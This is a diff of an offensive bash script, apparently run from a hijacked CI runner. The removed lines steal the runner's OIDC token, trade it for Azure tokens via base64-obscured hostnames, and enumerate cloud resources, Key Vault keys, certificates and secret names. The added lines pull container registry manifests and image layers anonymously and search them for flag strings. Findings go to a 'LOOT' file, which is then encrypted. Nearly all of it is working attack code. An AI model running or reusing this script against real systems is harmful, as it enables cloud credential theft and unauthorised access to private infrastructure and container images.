@@ -1,47 +1,40 @@
 #!/usr/bin/env bash
 set -uo pipefail
 echo "=== RUNNER SHELL PROOF ==="; id; hostname
-[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO OIDC"; exit 0; }
 b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
-AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
-ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
-KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
-AAD="${SC}${AADH}"; ARM="${SC}${ARMH}"; KV="${SC}${KVH}"
-OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
-aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
+ACR=crtblplatprodx3euoz.azurecr.io
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
 say "=== START $(date -u) ==="
-AR=$(aad "${ARM}/.default" | jq -r '.access_token // empty')
-SUB="$AZURE_SUBSCRIPTION_ID"
-U="${ARM}/subscriptions/$SUB/resources?api-version=2021-04-01"
-say "==== ALL RESOURCES (paginated) ===="
-while [ -n "$U" ]; do
-  R=$(curl -sS -H "Authorization: Bearer $AR" "$U")
-  say "$(echo "$R" | jq -c '.value[]?|{n:.name,t:.type,rg:(.id|split("/")[4]),loc:.location}')"
-  U=$(echo "$R" | jq -r '.nextLink // empty')
-done
-say "==== kv-sec keys ===="
-SECID="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
-say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${SECID}/keys?api-version=2022-07-01" | head -c 1500)"
-say "==== kv-sec certificates ===="
-say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${SECID}/certificates?api-version=2022-07-01" | head -c 1500)"
-say "==== kv-prod secrets (all pages) ===="
-KU="${ARM}/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2022-07-01"
-while [ -n "$KU" ]; do
-  KR=$(curl -sS -H "Authorization: Bearer $AR" "$KU")
-  say "$(echo "$KR" | jq -c '.value[]?.name')"
-  KU=$(echo "$KR" | jq -r '.nextLink // empty')
-done
-say "==== ACR anonymous pull attempt ===="
-LOGIN=crtblplatprodx3euoz.azurecr.io
-say "props: $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz?api-version=2023-07-01" | jq -c '{anon:.properties.anonymousPullEnabled,net:.properties.networkRuleSet,admin:.properties.adminUserEnabled}')"
-TOK=$(curl -sS "${SC}${LOGIN}/oauth2/token?service=${LOGIN}&scope=registry:catalog:*")
-say "TOKEN: $(echo "$TOK" | head -c 300)"
-AT=$(echo "$TOK" | jq -r '.access_token // empty')
-say "CATALOG: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${LOGIN}/v2/_catalog")"
-for R in $(curl -sS -H "Authorization: Bearer $AT" "${SC}${LOGIN}/v2/_catalog" | jq -r '.repositories[]? // empty'); do
-  say "TAGS $R: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${LOGIN}/v2/$R/tags/list")"
+ACC='application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json'
+for R in catalog-api tebamoto-reporting-api; do
+  say "############ REPO $R"
+  T=$(curl -sS "${SC}${ACR}/oauth2/token?service=${ACR}&scope=repository:${R}:pull" | jq -r '.access_token // empty')
+  say "TOK ${T:0:8}"
+  say "TAGS: $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list")"
+  for TAG in $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list" | jq -r '.tags[]? // empty'); do
+    say "---- $R:$TAG ----"
+    M=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${TAG}")
+    say "MANIFEST: $(echo "$M" | head -c 1200)"
+    DIGESTS=$(echo "$M" | jq -r '.manifests[]?.digest // empty')
+    if [ -n "$DIGESTS" ]; then
+      for D in $DIGESTS; do
+        say "CHILD $D: $(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${D}" | head -c 1500)"
+      done
+    fi
+    LAYERS=$(echo "$M" | jq -r '.layers[]?.digest // empty')
+    CFG=$(echo "$M" | jq -r '.config.digest // empty')
+    if [ -n "$CFG" ]; then
+      say "CONFIG: $(curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${CFG}" | head -c 3000)"
+    fi
+    for L in $LAYERS; do
+      say "LAYER $L:"
+      curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${L}" -o /tmp/L.tgz
+      say "  size=$(wc -c </tmp/L.tgz)"
+      tar -tzf /tmp/L.tgz 2>/dev/null | head -40 | sed 's/^/  f: /'
+      tar -xzf /tmp/L.tgz -O 2>/dev/null | grep -aioE 'flag\{[^}]{0,120}\}|FLAG\{[^}]{0,120}\}|flag[=: "][^ "]{0,120}' | head -20 | sed 's/^/  HIT: /'
+    done
+  done
 done
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
